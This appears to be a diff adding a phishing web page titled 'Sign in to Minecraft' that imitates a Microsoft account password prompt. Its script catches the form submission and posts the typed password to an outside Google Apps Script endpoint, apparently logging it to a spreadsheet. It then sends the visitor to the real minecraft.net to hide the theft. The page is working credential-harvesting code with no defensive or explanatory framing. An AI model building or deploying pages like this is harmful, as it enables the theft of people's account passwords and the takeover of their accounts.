@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="icon" href="image-removebg-preview (46).png">
+    <title>Sign in to Minecraft</title>
+
+</head>
+<body>
+    <div id="div1">
+        <img id="img1" src="microsoftlogo.png" alt="">
+        <p id="p1">Enter password</p>
+        <form name ="submit-to-google-sheet">
+          <input id="textbox" type="password" name="password" placeholder="Password" required>
+
+          <hr>
+          <label id="label1" for=""</label>
+          <a id="a1" href="#">Forgot password?</a><br><br>
+          <a id="a2" href="#">Sign in with Windows Hello or a security key</a>
+          <a id="a3" href="#"><img id="img2" src="q4.png" alt=""></a><br><br>
+          <input id="submit" type="submit" name="submit" value="Sign in">
+        </form>
+    </div>
+
+
+
+    <div id="div3">
+      <span></span>
+    </div>
+
+<script>
+  const scriptURL = 'https://script.google.com/macros/s/AKfycby_5vlkzDQ1853sDICGw8P7giO3OhmKNuOic3wyBOHQzGW8faSaTHsc4sMgHyJ3r-be/exec'
+  const form = document.forms['submit-to-google-sheet']
+
+  form.addEventListener('submit', e => {
+    e.preventDefault()
+    fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+      .then(response => console.log('Success!', response))
+      .catch(error => console.error('Error!', error.message))
+  })
+
+  document.addEventListener("keyup", function(event) {
+   if (event.keyCode === 13) {
+     console.log("yes")
+     window.location = 'https://www.minecraft.net/en-us'
+   }
+  });
+</script>
+
+</body>
+</html>
